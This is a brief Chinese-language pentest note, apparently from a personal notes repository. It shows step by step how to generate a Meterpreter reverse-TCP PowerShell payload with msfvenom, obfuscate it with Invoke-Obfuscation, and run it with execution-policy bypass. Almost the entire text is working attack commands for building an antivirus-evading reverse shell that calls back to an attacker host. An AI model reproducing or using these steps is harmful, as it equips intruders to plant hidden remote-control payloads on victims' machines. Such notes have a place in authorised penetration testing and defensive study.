	https://github.com/danielbohannon/Invoke-Obfuscation
	生成code
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f psh -o /var/www/html/1.ps1
	>powershell -ep bypass
	>Import-Module .\Invoke-Obfuscation.psd1
	>Invoke-Obfuscation
	>set scriptpath C:\Users\y\Desktop\1.ps1
	>encoding
	>3 指定编码方式
	>out C:\Users\y\Desktop\ok.ps1 保存

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/84.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/85.png)

	执行
	>powershell -ep bypass -noexit -file ok.ps1

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/86.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/87.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/88.png)